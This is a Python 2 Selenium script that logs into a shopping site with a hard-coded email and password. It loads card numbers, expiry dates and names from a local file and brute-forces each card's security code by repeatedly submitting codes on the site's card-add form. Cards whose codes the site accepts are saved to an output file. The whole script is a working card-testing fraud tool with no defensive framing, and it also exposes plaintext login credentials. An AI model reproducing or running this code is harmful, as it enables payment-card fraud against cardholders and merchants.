#!coding=utf-8
import sys,os,time,random
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
reload(sys)
sys.setdefaultencoding("utf-8")

from selenium import webdriver
option = webdriver.ChromeOptions()
prefs = {"profile.default_content_setting_values":{"images":2}}
option.add_experimental_option('prefs', prefs)
driver = webdriver.Chrome(executable_path='D:\Program Files\Chrome\chromedriver.exe', chrome_options=option)
driver.maximize_window()
#driver.set_page_load_timeout(60)
def existElement(value):
    
        #self.loadJquery()
    js = '''
        if($('%s').not(':hidden').length > 0){return 1;}else{return 0;}
    ''' % value
    try:
        a=driver.execute_script(js)
        return a
    except Exception:
        return 0
def findelement(value): 
    try:
        WebDriverWait(driver,20).until(ec.presence_of_element_located((By.CSS_SELECTOR,value)))
        if driver.find_element(By.CSS_SELECTOR,value).is_displayed():
            return driver.find_element(By.CSS_SELECTOR,value)
    except Exception,e:
        pass
def elementSelect(ele,value):
    element = ele
    #value = int(value)
    select  = Select(element)
    num = len(Select(element).options)-1
    #select.select_by_index(value)
    select.select_by_value('%s' % str(value))
    time.sleep(1)

driver.get(u'https://www.domeshoppingzone.com/dmc/CreditCardAdd')
findelement('#userId').send_keys(u'qspfqc136198@yahoo.com')
findelement('#password').send_keys(u'asdqwe123')
findelement('.center.mt20>input').click()
findelement('.submit>img').click()
time.sleep(5)
findelement('.link>li>a[href="https://www.domeshoppingzone.com/dmc/Mypage"]').click()
time.sleep(5)
findelement('#sectionMypageNav>ul>li>a[href="https://www.domeshoppingzone.com/dmc/CreditCard"]').click()
#dati
time.sleep(5)
l = []
with open('D:\eclipsworkdir\\appiummaster\src\jianzhi\wangye.txt','r') as f:
    for i in f.readlines():
        inn = i.strip().split('|')
        a = inn[0]
        for j in xrange(4):
            b = a[0:4]
            a = a[4:]
            l.append(b)
        for h in xrange(1,4):
            if h == 1:
                if int(inn[h]) <10:
                    inn[h] = inn[h][1:]
            if h == 2:
                inn[h] = inn[h][2:]
            l.append(inn[h])

        findelement('#off_cardNo01').send_keys(l[0])
        print findelement('#off_cardNo01').text
        findelement('#off_cardNo02').send_keys(l[1])
        findelement('#off_cardNo03').send_keys(l[2])
        findelement('#off_cardNo04').send_keys(l[3])
        year = findelement('#off_cmonth')
        elementSelect(year, str(l[4]))
        month = findelement('#off_cyear')
        elementSelect(month, str(l[5]))
        findelement('#off_cname').send_keys(l[6])
        for i in xrange(830,999):
            findelement('#cardsec').clear()
            if i<10:
                strr = '00'+str(i)
            elif i>9 and i<100:
                strr = '0'+str(i)
            else:
                strr = str(i)
            findelement('#cardsec').send_keys(strr)
            
            findelement('.submit>img').click()
            if existElement('.ml05'):
                findelement('.ml05').click()
                with open('D:\eclipsworkdir\\appiummaster\src\jianzhi\wangyee.txt','a+') as fi:
                    for i in l:
                        fi.write(i)
                        fi.write('|')
                    fi.write(strr)
                    fi.write("\n")
                break 
        
        l=[]
        continue        
            #time.sleep(2)


